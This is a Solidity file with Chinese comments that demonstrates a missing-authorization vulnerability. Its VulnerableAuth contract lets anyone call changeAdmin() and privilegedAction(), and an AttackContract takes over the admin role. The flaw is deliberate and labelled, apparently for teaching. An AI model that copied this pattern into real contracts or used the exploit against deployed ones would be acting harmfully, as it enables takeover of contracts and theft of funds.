pragma solidity >=0.8.0;

/*
  漏洞名稱：Incorrect Authentication or Authorization
  描述：本合約未正確驗證或授權呼叫者，使得任何人都能夠變更管理員（admin）或執行僅限管理員的操作。

  攻擊手法說明：
  1. 部署 VulnerableAuth 合約，初始管理員設定為部署者。
  2. 攻擊者部署 AttackContract 並將 VulnerableAuth 的地址作為參數傳入。
  3. 攻擊者呼叫 AttackContract 的 attack() 函式，該函式會利用 VulnerableAuth 中缺失的權限檢查，
     將管理員變更為攻擊者地址，並成功執行應僅限管理員的 privilegedAction() 操作。
*/

contract VulnerableAuth {
    // 狀態變數：管理員，
    // 漏洞點：此變數並未限制只能由符合法身份的人修改
    address public admin;

    constructor() {
        admin = msg.sender;
    }

    // 漏洞函式：本應該僅允許管理員呼叫，但缺少身份驗證檢查
    function changeAdmin(address _newAdmin) public {
        // 漏洞重點：缺少 require 判斷，導致任何人皆可修改 admin
        admin = _newAdmin;
    }

    // 漏洞函式：本應該僅允許管理員呼叫，但缺少身份驗證檢查
    function privilegedAction() public view returns (string memory) {
        // 漏洞重點：無任何驗證，任何人皆可執行此特權操作
        return "Privileged action executed";
    }

    // 正確定義接收 Ether 的 fallback 函式
    receive() external payable {}
}

// 攻擊合約，示範如何利用上述漏洞
contract AttackContract {
    VulnerableAuth public vulnerableContract;

    constructor(VulnerableAuth _vulnerable) {
        vulnerableContract = _vulnerable;
    }

    // 攻擊範例：利用變更管理員漏洞，將管理員設為攻擊者地址，從而可執行受限操作
    function attack() public returns (string memory) {
        // 攻擊步驟1: 呼叫 changeAdmin() 將管理員變更為攻擊者 (msg.sender)
        vulnerableContract.changeAdmin(msg.sender);
        
        // 攻擊步驟2: 攻擊者現在變為管理員，可執行特權操作
        return vulnerableContract.privilegedAction();
    }
}
